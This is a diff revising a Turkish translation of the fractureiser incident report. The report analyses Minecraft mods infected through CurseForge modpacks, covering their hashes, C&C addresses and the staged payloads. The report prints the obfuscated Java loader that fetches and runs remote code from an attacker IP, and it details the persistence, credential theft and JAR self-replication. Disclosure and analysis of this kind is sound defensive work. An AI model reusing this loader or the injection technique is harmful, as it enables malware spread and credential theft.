@@ -1,25 +1,25 @@
-# Teknik Bilgi
+# Teknik Bilgiler 
 
-## Dağıtım
+## Zararlı Yazılımın Dağıtımı
 
-Bazı mod paketleri, geliştiricilerin bilgisi olmadan kendileri için yayınlanan güncellemelere sahip olmuş ve kötü amaçlı modlar eklemiştir. Bu mod paketi güncellemeleri yüklendikten hemen sonra arşivlendi, yani *web kullanıcı arayüzünde gösterilmiyor, yalnızca API aracılığıyla gösteriliyorlar.*
+Bazı mod paketleri geliştiricilerin bilgisi olmadan güncellemer yayınlarak zararlı modlara bir dependency eklendi.
+Bu mod paketi güncellemeleri yüklendikten hemen sonra arşivlendi, yani bu güncellemeler *web kullanıcı arayüzünde gösterilmiyor, yalnızca API aracılığıyla gösteriliyorlar.*
 
+Bu zararlı modların birkaç haftalık bir zamana uzanan yükleme geçmişleri söz konusu. Bu modların çoğu
+tek kullanımlık ve adlarının otomatik olarak oluşturulduğu belli olan hesaplar tarafından 
+yüklenmiş olması ile beraber büyük ihtimalle enfeksiyonun kaynağı idi. Luna Pixel Stüdyosu geliştiriclerden
+birinin bu modlardan birini ilginç bulup test etmesi sebebi ile enfekte oldu.
 Kötü niyetli modların geçmişte birden fazla hafta yükleme tarihleri vardır. Bunların çoğu
-açıkça otomatik olarak oluşturulmuş isimlere sahip tek kullanımlık hesaplar tarafından yüklenmiştir ve muhtemelen
-enfeksiyonun. Luna Pixel Studios, bir geliştiricinin bunlardan birini test etmesi nedeniyle tehlikeye girdi
-Modlar, yüklemek için ilginç duruyorlar.
 
-### Bilinen etkilenen modlar ve eklentiler
+### Zararlı yazılımdan etkilendiği bilinen modlar ve eklentiler
 
-Not: Bu liste **kapsamlı değildir**. Bu liste, Araştırmanın ilk günlerinde
-araştırdık ve kısa sürede bunun kapsamının düşündüğümüzden çok daha büyük olduğunu fark ettik,
-Bu da bireysel vakaların takibini anlamsız kılıyor. Tarihsel amaçlar için burada bırakılmıştır.
+Not: Bu listede **tüm herşey yok**. Bunu araştırmanın ilk günlerinde oluşturduk ve düşündüğümüzden
+çok daha fazla zararlı mod ve eklenti söz konusu olduğundan tek tek bunları takip etmenin
+gereksiz olduğuna karar verdik, tahrisel amaçlı buradadır.
 
-Ayrıca CurseForge'un
-[liste](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
-etkilenen projeler listesine göz atın.
+Ayrıca CurseForge'un [etkilnen projeler listesine](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/) göz atın.
 
-|mod/eklenti|bağlantı(lar)|SHA1|"Yükleyici"|
+|mod/eklenti|bağlantı(lar)|SHA1|"mod'u yükleyen"|
 |---|---|---|---|
 |Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
 |Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
@@ -33,19 +33,24 @@ etkilenen projeler listesine göz atın.
 
 Darkhax bunu yolladı: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f
 
-potansyel olarak: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib
+Potansiyel olarak bu listeye dahil: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib
 
-## Aşama 0 (Enfekte mod jarları)
+## Stage 0 (Enfekte olmuş mod JARları)
+**Çeviri notu:** Burdan bahsi geçen "stage"'ler zararlı yazılımın farklı "aşamalarıdır". Teknik bir terim
+olduğundan çevirmemeye karar verdik.
 
-Etkilenen mod veya eklentilerin ana sınıflarına yeni bir `static void` yöntem eklenir ve bu yöntemin çağrısı, sınıfın statik başlatıcısına yerleştirilir. DungeonZ için yöntem `_d1385bd3c36f464882460aa4f0484c53` adını taşır ve `net.dungeonz.DungeonzMain` içinde bulunur. Skyblock Core için yöntem `_f7dba6a3a72049a78a308a774a847180` adını taşır ve `com.bmc.coremod.BMCSkyblockCore` içine yerleştirilir. HavenElytra için ise kod, `valorless.havenelytra.HavenElytra` içinde kullanılmayan statik başlatıcının içine doğrudan yerleştirilir.
+Etkilenen mod ve eklentilerin ana yani main class'larına bir `static void` fonksiyonu ve aynı class'ın
+initializer fonksiyonuna bu fonksiyona bir çağrı eklendi. DungeonZ modu için bu fonksiyonun adı `_d1385bd3c36f464882460aa4f0484c53` ve `net.dungeonz.DungeonzMain`'da, Skyblock Core için `_f7dba6a3a72049a78a308a774a847180` ve `com.bmc.coremod.BMCSkyblockCore`'da, HavenElytra içinse kod
+`valorless.havenelytra.HavenElytra`'ın diğer türlü kullanılmayan static initializer'ında.
 
-Metodun kodu, dize sabitleri yerine `new String(new byte[]{...})` kullanılarak şifrelenmiştir.
+Fonksiyonun kodu, string literal'leri yerine `new String(new byte[]{...})` obfuscate edilmiştir.
 
-D3SL örneğinden "Create Infernal Expansion Plus" adlı "Create Infernal Expansion Compat" kopya bir versiyonu, ana mod sınıfına kötü amaçlı yazılım eklenmiş bir şekilde oluşturuldu:
+D3SL'in "Create Infernal Expansion Plus" örneğinden, `Create Infernal Expansion Compat`'ın kopyalanmış bir versioyonu,
+zararlı yazılım ana mod class'ına eklenmiş halde:
 ```java
 static void _1685f49242dd46ef9c553d8af1a4e0bb() {
   Class.forName(new String(new byte[] {
-      // "Utility"
+      // decode edince "Utility" oluyor
     85, 116, 105, 108, 105, 116, 121
   }), true, (ClassLoader) Class.forName(new String(new byte[] {
       // "java.net.URLClassLoader"
@@ -68,118 +73,139 @@ static void _1685f49242dd46ef9c553d8af1a4e0bb() {
 }
 ```
 
-Bu:
-1. `URLClassLoader` ile `http://[85.217.144.130:8080]/dl` adresindeki URL'yi oluşturur ([shodan](https://www.shodan.io/host/85.217.144.130)).
-2. Sınıf yükleyici üzerinden `Utility` sınıfını yükler ve internetten kod alır.
-3. `Utility` üzerinde `run` metodunu çağırır ve her bir enfekte mod için farklı bir dize argümanı geçirir. Örneğin:
+Bu kod:
+1. `http://[85.217.144.130:8080]/dl`'lesine sahip bir `URLClassLoader` oluşturuluyor ([shodan linki](https://www.shodan.io/host/85.217.144.130))
+2. Classloader'dan `Utility` class'ını yüklüyor, class'ın kodunu internetden çekiyor
+3. `Utility` class'ını her mod için farklı olan bir string argümanı ile `run` fonksiyonunu çağrıyor. Mesela:
    - Skyblock Core: "`-74.-10.78.-106.12`"
    - Dungeonz: "`-114.-18.38.108.-100`"
    - HavenElytra: "`-114.-18.38.108.-100`"
    - Vault Integrations: "`-114.-18.38.108.-100`"
 
-Geçirilen sayılar, 1. Aşama tarafından baytlara ayrıştırılır ve ".ref" adlı bir dosyaya yazılır. Bu, geliştiricinin enfeksiyon kaynaklarını izlemek için kullandığı bir yöntem gibi görünüyor.
+Bu fonksiyona verilen sayılar stage 1 tarafından bytelara ayrıştırlır ve ".ref" isimli bir dosyaya yazılıyor.
+Enfeksiyonun kaynaklarını takip etmek için geliştiricinin kullandığı bir yöntem gibi görünüyor.
 
-Sınıf yükleyicisinin oluşturulması, Aşama 1'in kullandığı Cloudflare URL'sini kullanmayarak sabitlenmiş bir şekilde belirli bir URL'ye bağlıdır. İlgili IP'nin şu anda çevrimdışı olması, bu durumda mevcut olarak bildiğimiz Aşama 0 yüklerinin artık işlevsel olmadığı anlamına gelir.
+Classloader'ın oluşturulması bu sabit URL'e bağlı ve Stage 1'in kullandığı Cloudflare URL'sini kullanmıyor,
+Bu IP adresi artık offline yani çevrimdışı olduğundan *anlık olarak Stage 0 payloadları çalışmadığının
+farkındayız*
 
-## Aşama 1 (`dl.jar`)
+## Stage 1 (`dl.jar`)
 
 SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`
 
-[Kötü amaçlı yazılıma ait decompile edilmiş dosyalara buradan ulaşabilirsiniz.](../decomp).
+[Zararlı yazılıma ait decompile edilmiş dosyalara buradan ulaşabilirsiniz.](../decomp).
 
-`Utility.run` işlevinin yaptığı ilk şey, sistem özelliği olan `neko.run`'ın ayarlanıp ayarlanmadığını kontrol etmektir. Eğer ayarlanmışsa, hemen çalışmayı durdurur. Ayarlanmamışsa, boş bir dize olarak ayarlar ve devam eder. Bu, kötü amaçlı yazılımın birden fazla modu etkilemişse kendisini birden çok kez çalıştırmaktan kaçınmaya çalıştığını göstermektedir. *Bu, Aşama 1'in İnternet üzerinden indirildiği ve değişebileceği göz önüne alındığında, güvenilir bir durdurma mekanizması olarak güvenilmemelidir.*
+`Utility.run` fonksiyonun yaptığı ilk şey, sistem özelliği olan `neko.run`ın ayarlı olup olmadığı kontrol etmek,
+eğer durum bu ise zararlı yazılım *anında çalışmayı bırakır.* Durum bu değilse bu sistem özelliğini boş bir
+string olarak ayarlar ve devam eder. Bu zararlı yazılımın eğer birden fazla modu infekte etmiş ise kendini birden fazla kez çalıştırmayı önleme şekli gibi görünüyor, fakat bunu "killswitch" olarak kullanmak mümkün değil,
+yani "`neko.run`'ı ayarla zararlı yazılım çalışmaz" demek değil *çünkü Stage 1 inetrnetden indiriliyor ve
+içeriği değiştirilebilir.*
 
-`Utility.run` işlevi, `85.217.144.130` IP adresi ve Cloudflare Pages alan adı (`https://files-8ie.pages.dev/ip`) ile iletişim kurmaya çalışır. İstismar raporları zaten gönderilmiştir. Pages alan adı, ilk IP yanıt vermezse C&C sunucusunun IP'sini almak için kullanılır - URL, bir IPv4 adresinin ikili bir temsilini yanıt olarak döndürür.
+Sonra `Utility.run` fonksiyonu, `85.217.144.130` IP adresi ve Cloudflare Pages domaini (`https://files-8ie.pages.dev/ip`) ile iletişim kurmaya çalışır. Bu adresler için kötüye kullanım raporlarını çoktan gönderdik merak etmeyin. Pages domain'i eğer ilk IP adresi cevap vermez ise C&C (Komut ve Kontrol) sunucusunun IP adresini almak için kullanıyor -
+sayfa binary formunda bir IPv4 adresi ile dönüş yapıyor.
 
-*İstismar raporu sunucu sağlayıcısına iletildikten sonra C&C IP'si nullrouted edildi. Yeni bir C&C sunucusunun devreye alınıp alınmadığını görmek için Cloudflare sayfasını gözlemlememiz gerekecek. Bunu planlamadıklını düşünemem.* Hızlı yanıtınız için Serverion'a teşekkür ederim.
+*Sunucu sağlayıcısına kötüye kullanımı raporlardıktan sonra C%C sunucusunun IP'si nullroute edildi. Cloudflare
+sayfasında yeni bir C&C IP adresi yayunlanıp yayınlanmayacağını kontrol etmemiz gerek, açıkçası bunu büyük planlamışlardır* Hızlı yanıtladıkları için Serverion'a teşekürler.
 
-*Cloudflare Pages alan adı kapatıldı* "107.189.3.101" IP adresinde yeni bir C&C sunucusu bulunmaktadır.
+*Cloudflare Pages alan adı kapatıldı* `107.189.3.101` IP adresinde yeni bir C&C sunucusu söz konusu.
 
-Aşama 1, aşağıdaki işlemleri gerçekleştirerek kalıcılık sağlamaya çalışır:
-1. Sunucudan Aşama 2'yi indirir (Linux'ta lib.jar, Windows'ta libWebGL64.jar olarak adlandırılır).
-2. Aşama 2'nin otomatik olarak başlatılmasını sağlar:
-   * Linux üzerinde, systemd birim dosyalarını `/etc/systemd/system` veya `~/.config/systemd/user` dizinine yerleştirmeye çalışır.
-     * Kullanıcı klasörüne yerleştirdiği birim dosyası çalışmaz çünkü kullanıcı birimleri için mevcut olmayan `multi-user.target` kullanmaya çalışır.
-   * Windows üzerinde, kaydı değiştirmeye çalışarak (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) kendisini başlatmaya veya
-     başarısız olursa `Windows\Start Menu\Programs\Startup` klasörüne kendini eklemeye çalışır.
+Stage 1, ardından aşağıdaki işlemleri gerçekleştirerek kalıcılık yani persistence sağlamaya çalışıyor:
+1. Sunucudan Stage 2'yi indirir (bu dosya Linux'da lib.jar, Windows'da libWebGL64.jar olarak adlandırılıyor)
+2. Stage 2'nin otomatik olarak başlatılmasını sağlamak adına:
+   * Linux'da systemd unit dosyalarını `/etc/systemd/system` ya da `~/.config/systemd/usr` dizinine
+   yerleştirmeye çalışır.
+    * Kullanıcı dizinine yerleştirilen unit dosyası çalışmaz çünkü `multi-user.target` kullanmaya çalışıyor,
+    bu kullanıcı unit dosyaları için mevcut değil.
+   * Windows'da registry'i (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) modifiye etmeye
+   çalışır, başarısız olursa kendini `Windows\Start Menu\Programs\Startup` dizinine eklemeye çalışır
 
 ## Aşama 2 (`lib.jar` ya da `libWebGL64.jar`)
+## Stage 2 (`lib.jar` ya da `libWebGL64.jar`)
 
-Bilininen sha-1 hash'leri:
+Bilininen SHA1 hash'leri:
 * `52d08736543a240b0cbbbf2da03691ae525bb119`
-* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL's earlier upload)
+* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL'in bir önceki yüklemesi)
 
-Aşama 2, Allatori obfuscator'ün demo sürümü ile karıştırılmıştır ve ana sınıfı "Bootstrap" olarak adlandırılmıştır. Ayrıca, başka bir sınıf olan "h" adında bir sınıf daha içerir. Bu sınıf, iletişim amacıyla kullanılan basit bir sınıf gibi görünse de, içeriği boştur. Kaynak kodunun yeniden oluşturulmaya yönelik bir girişimini aşağıda bulabilirsiniz:
+Stage 2, Allatori obsfucator'ın demo sürümü ile obsfucate edilmiş, ana class'ı `Bootstrap` olarak adlandırılmıştır.
+Ayrıca `h` adında bir class daha içerir, bu class iletişim amacı ile kullanılan basit bir class gib görünse de
+içeriği boş. Kaynak kodunu yeniden oluşturmaya yönelik bir girişimi burdan inceleyebilrsiniz:
 https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe
 
 Çalıştırıldığında aşağıdaki işlemleri gerçekleştirir:
 
-1. `9655` numaralı bağlantı noktasını açar ve JVM kapanırken onu kapatmak için bir kapatma kancası ekler.
-2. Kendisini disk üzerinde bulur ve yanında çalışır.
-3. Eğer `.ref` dosyası mevcutsa, dosyadan tanımlayıcı anahtarı okur.
-4. Aşağıdaki adımları içeren bir döngü başlatır:
-    1. Sunucuyu kontrol etmek için `https://[files-8ie.pages.dev]:8083/ip` adresine bağlanır ve ona bağlanmaya çalışır.
-    2. Güncelleme kontrolünün devam etmesi gerekip gerekmediğini belirten bir bayrak alır, devam etmezse hata verir (port `1338` üzerinden sunucuya bildirilir).
-    3. Devam etmesi gerekiyorsa, bir karma değeri alır ve varsa `client.jar` ile karşılaştırır, güncelleme yapmak isteyip istemediğine dair bir bayt gönderir.
-    4. Güncelleme yapmak istiyorsa, `client.jar` dosyasını alır ve üzerine yazar/yaratır, dosya özniteliklerini kullanarak gizler.
-    5. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` adlı statik yöntemi yükler ve çağırır.
-    6. 5 saniye boyunca uyur.
+1. `9655` numaralı port'u açar ve JVM kapanırken portu kapatmak adına bir kapatma hooku yerleştirir
+2. Diskde kendini bulup kendi yanında çalışır
+3. Eğer `.ref` dosyası mevcut ise dosyadan ID anahtarını okur.
+4. Aşağıdaki eylemleri gerçekleştirmek adına bir döngüye girer:
+    1. Sunucuyu adresini almak adına `https://[files-8ie.pages.dev]:8083/ip` aresine bağlanır ve aldığı adrese bağlanmaya çalışır.
+    2. Güncelleme kontrolünün devam etmesi gerekip gerekmediğini belirten bir bayrak (flag) alır, diğer türlü
+    sunucuda `1338` portuna raporlar.
+    3. Devam etmesi gerekiyorsa cevap olarak bir hash alır ve `client.jar`'ın hash'i ile karşılaştırır (dosya
+    aynı mı değil mi ona bakar yani), ardından güncelleme yapıp yapmak istemediğini dair bir byte gönderir.
+    4. Güncelleme yaparsa `client.jar` dosyasını sunucudan alıp `client.jar` zaten varsa üzerine yazar, yoksa
+    dosyayı oluşturur. Dosya attributelarını kullanarak `client.jar`'ı gizler.
+    5. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` statik fonksiyonunu yükleyip çağrır.
+    6. 5 saniye boyunca bekler (uyur).
 
-## Aşama 3 (`client.jar`)
+## Stage 3 (`client.jar`)
 
-sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
-sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`
+SHA1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
+SHA1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`
 
-`client.jar`, son derece obfuskeli ve karmaşık bir kod demetidir ve hem Java kodunu hem de yerel kodu içerir.
+`client.jar`, son derece obfuscat edilmiş, karmaşık ve hem java hem de native kod içeriyor. 
 
-`client.jar`, içinde `hook.dll` adlı bir yerel yük taşır. Aşağıda dekompilasyonu yapılmış bir örneği bulunmaktadır: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c
+`client.jar` içinde `hook.dll` adında bir native payload söz konusu. Decompiled hali: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c
 
-Aşağıda listelenen iki özel işlev, Java'dan çağrılmak üzere JNI kullanılarak oluşturulmuştur:
+Aşağıda listelenen java'dan çağrılması için yazılan (JNI tarafından çağrılabilirler de ondan) iki tane fonksiyon
 * `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
 * `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`
 
-Yapılan analizlere göre, bu işlevler aşağıdaki görevleri yerine getirmektedir:
-* Pano içeriğini okuma
+Yapılan analizlere göre, bu fonksiyonlar aşağıdaki görevleri yerine getiriyor:
+* Pano (clipboard) içeriğini okuma
 * Microsoft hesap kimlik bilgilerini çalma
 
-Ayrıca, aşağıdaki işlemleri gerçekleştirmeye çalışan kod kanıtları bulunmaktadır:
-* Minecraft modlarını taramak için sistemdeki *tüm* jar dosyalarını bulma (Forge/Fabric/Quilt/Bukkit tespiti
-  yaparak) veya [Bir Ana Sınıf bildir](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
-  (çoğu basit Java programı) ve bunlara Stage 0 enjekte etme girişimi
-* Birçok web tarayıcısının çerezlerini ve giriş bilgilerini çalma
-* Panodaki kripto para birimi adreslerini, muhtemelen saldırganın sahip olduğu alternatif adreslerle değiştirme
+Ayrıca, aşağıdaki işlemleri gerçekleştirmeye çalışan kodlar bulunmaktadır:
+* (Forge/Fabric/Quilt/Bukkit tespiti yaparak) Minecraft modları gibi görünen sistemdeki *tüm* JAR dosyalarını tarama
+ya da bir ana class tanımlayarak içelerine stage 0'ı inejekte etmeyi çalışmak
+* Birçok web tarayıcısının çerezlerini (cookie) ve giriş bilgilerini çalma
+* Panodaki (clipboard) kripto para birimi adreslerini, muhtemelen saldırganın sahip olduğu alternatif adreslerle değiştirme
 * Discord kimlik bilgilerini çalma
-* Microsoft ve Minecraft kimlik bilgilerini, çeşitli başlatıcıları kullanarak çalma
+* Çeşitli launcher'lardan Microsoft ve Minecraft kimlik bilgilerini
 * Kripto cüzdanlarını çalma
 
-Jar dosyaları, aşağıdaki şekilde Minecraft modları veya eklentileri olarak tespit edilir:
+JAR dosyalarının minecraft mod ya da eklentisi olduğunu tespit edilmek adına aşağıdaki işlemler
+gerçekleştirilir:
+* Forge (`dev/neko/e/e/e/A`): Zararlı yazılım, her modda gerekli olarak kullanılan `@Mod` yazısını bulmaya çalışır
+* Bukkit (`dev/neko/e/e/e/C`): Bir class'ın Bukkit'in `JavaPlugin` class'ından extend edilip edilmediğini kontrol eder.
+* Fabric/Quilt (`dev/neko/e/e/e/i`): Bir class'ın `ModInitializer` interface'inden implemente edilip edilmediğini kontrol eder.
+* Bungee (`dev/neko/e/e/e/l`): Bir class'ın Bungee'nin `Plugin` class'ından extend edilip edilmediğini kontrol eder.
+* Vanilla (`dev/neko/e/e/e/c`): Ana client class'ı olan `net.minecraft.client.main.Main`ın var olup olmadığını kontrol eder.
 
-* Forge (`dev/neko/e/e/e/A`): Kötü amaçlı yazılım, her modda gereken `@Mod` açıklamasını bulmaya çalışır.
-* Bukkit (`dev/neko/e/e/e/C`): Kötü amaçlı yazılım, bir sınıfın Bukkit'in `JavaPlugin` sınıfını genişletip genişletmediğini kontrol eder.
-* Fabric/Quilt (`dev/neko/e/e/e/i`): Kötü amaçlı yazılım, bir sınıfın `ModInitializer` arayüzünü uygulayıp uygulamadığını kontrol eder.
-* Bungee (`dev/neko/e/e/e/l`): Kötü amaçlı yazılım, bir sınıfın Bungee'nin `Plugin` sınıfını genişletip genişletmediğini kontrol eder.
-* Vanilla (`dev/neko/e/e/e/c`): Kötü amaçlı yazılım, ana istemci sınıfı `net.minecraft.client.main.Main`in var olup olmadığını kontrol eder.
+## Stage 3 (`unobf-client.jar`)
 
-## Aşama 3 (`unobf-client.jar`)
+2023-06-07 14:20 UTC civarı, stage 3 client JAR dosyasının görünüşe göre yanlışlıkla obfuscated edilmemiş bir versiyonu ile değiştirildi. Arşive şurdan ulaşabilirsiniz: https://github.com/clrxbl/NekoClient
 
-2023-06-07 14:20 UTC tarihinde, aşama 3 istemci jar dosyasının görünüşe göre yanlışlıkla obfuscation (bulanıklaştırma) işlemi uygulanmamış bir sürümle değiştirildiği belirtiliyor. Arşive şuradan erişebilirsiniz: https://github.com/clrxbl/NekoClient
-
-Bu durum, önceki obfuscated (`client.jar`) örneği üzerinde yapılan analizdeki şüphelenilen davranışın/kanıtların doğrulandığını gösteriyor.
+Bu sayede önceki obfuscated (`client.jar`) örnek üzerinde yapılan analizin sonucu ortaya çıkan ve şüphelenilen
+davranışların doğrulanmasını sağlandı.
 
 ### Çoğaltma (Replication)
 
-Çoğaltma işlemi, yerel makinedeki tüm dosya sistemine ait jar dosyalarındaki sınıfların otomatik işlenmesi yoluyla gerçekleştirilir. Belirli kriterleri karşılayan sınıflar içeren herhangi bir jar dosyası enfeksiyon için uygun hale gelir. Yerel dosya sistemini tarama ve kötü amaçlı kod enjeksiyonu süreci burada bulunabilir: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)
+Çoğaltma işlemi, yerel makinedeki tüm dosya sistemine ait JAR dosyalarındaki class'ların otomatik işlenmesi yoluyla gerçekleştirilir. Belirli kriterleri karşılayan class'ları içeren herhangi bir JAR dosyası enfeksiyon için uygun hale gelir. Dosya sistemini tarama ve zararlı kod enjeksiyonu süreci burada bulunabilir: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)
 
 İşlem sürecinde aranan kriterler burada bulunabilir: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)
 
-* `BungeecordPluginTemplate` sınıflarda `net/md_5/bungee/api/plugin/Plugin` arabirimini arar.
-* `FabricModTemplate` sınıflarda `net/fabricmc/api/ModInitializer` arabirimini arar.
-* `ForgeModTemplate` sınıflarda `net/minecraftforge/fml/common/Mod` açıklamasını arar.
-* `MinecraftClientTemplate` jar içinde `net/minecraft/client/main/Main.class` ve `net/minecraft/client/gui/GuiMultiplayer.class` dosyalarının varlığını kontrol eder.
-* `SpigotPluginTemplate` sınıflarda `org/bukkit/plugin/java/JavaPlugin` üst türünü arar.
-* Yukarıdakilerin hiçbiri sınıfa uymazsa, [jar dosyasının ana sınıfını](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) enfekte etmeye çalışır.
+* `BungeecordPluginTemplate`: `net/md_5/bungee/api/plugin/Plugin` interface'ini arar.
+* `FabricModTemplate`: `net/fabricmc/api/ModInitializer` interface'ini arar.
+* `ForgeModTemplate`: `net/minecraftforge/fml/common/Mod` yazısını arar.
+* `MinecraftClientTemplate`: JAR'ın içinde `net/minecraft/client/main/Main.class`'ın ve `net/minecraft/client/gui/GuiMultiplayer.class`'ın varlığını kontrol eder.
+* `SpigotPluginTemplate`: Class'larda `org/bukkit/plugin/java/JavaPlugin` super tipini arar.
+* Hiç biri olmazsa [jar dosyasının ana class'ını](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) enfekte etmeye çalışır.
 
-Enjeksiyon işlemi, kötü amaçlı kodun `Loader` sınıfında bir statik yöntem olarak bildirildiği şekilde gerçekleşir. Yanında bulunan `Injector` sınıfı, kodu `Loader`dan çıkarıp enfeksiyon hedefi olan yeni sınıflara yerleştirmekten sorumludur. `Injector.loadInstallerNode(...)` yönteminin dönüş değeri, enfeksiyon sürecini açıklayan bir `MethodNode`'dur. Şimdi bu yöntemi hedeflenen sınıfa eklemeleri gerekmektedir. [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) içinde, bunu başarmak için `Entry.inject(MethodNode)` yöntemini çağırmaktadırlar. Kötü amaçlı yöntemin çağrılmasını sağlamak için bu `inject` yöntemi, hedeflenen sınıfın statik başlatıcısına eklenen bir mantık ekler ve eklenen yöntemi çağırır. Statik başlatıcı, sınıf ilk yüklendiğinde çalıştırıldığından ve hedeflenen sınıf bir eklenti/mod olduğundan, bu kodun her zaman enfekte mod paketlerini veya sunucuları çalıştıran kullanıcılar tarafından tetikleneceği varsayılır. Sonrasında, jar dosyası yeniden enfekte hedef sınıfla birlikte paketlenir.
+İnjekte edilen zararlı kod Stage0'da görülen backdoor mantığı. İnjeksiyon zararlı kod `Loader` class'ında statik
+bir fonksiyonda declare edilerek sağlanır. `Injector` class'ı `Loader`dan zararlı kodu extract etmek ve enfeksiyon
+için yeni hedeflenen class'lara yazmak ile görevlidir. `Injector.loadInstallerNode(...)`ın dönüş değeri, 
+infeskyion işleminin kendisi çizgilendiren bir `MethodNode`. Şimdi tek yapmaları gereken hedef class'a fonksiyonu
+eklemek. [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) içinde, bunu başarmak için `Entry.inject(MethodNode)` yöntemini çağırıyorlar. Zararlı fonksiyonun çağrılmasını sağlamak için bu `inject` fonksiyonu, hedeflenen class'ın static initializer'ına mantık ekliyor ve eklenen fonksiyonu çağırır. Static initializer, class ilk yüklendiğinde çalıştırıldığından ve hedeflenen class bir eklenti/mod olduğundan, bu kodun her zaman enfekte mod paketlerini veya sunucuları çalıştıran kullanıcılar tarafından tetikleneceği varsayılıyor. Sonrasında, JAR dosyası enfekte edilen yeni class ile beraber tekrardan paketlenir.
 
 ### Anti-sandbox hileleri
 
